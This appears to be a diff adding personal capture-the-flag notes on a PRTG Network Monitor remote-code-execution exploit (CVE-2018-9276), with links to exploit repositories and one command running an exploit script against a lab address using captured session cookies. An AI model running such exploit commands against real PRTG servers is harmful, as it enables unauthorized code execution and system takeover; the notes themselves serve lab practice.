@@ -1,0 +1,7 @@
+https://github.com/shk0x/PRTG-Network-Monitor-RCE
+
+Command
+./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.2.650811910.1670997600; _gid=GA1.2.599714283.1671086229; OCTOPUS1813713946=ezNEMkVFNjRFLTg0MTAtNDBERi1BQzE4LTQyOTFDNEJEMTUwOH0%3D; _gat=1"
+
+https://github.com/A1vinSmith/CVE-2018-9276
+Show multiple PRTG exploits
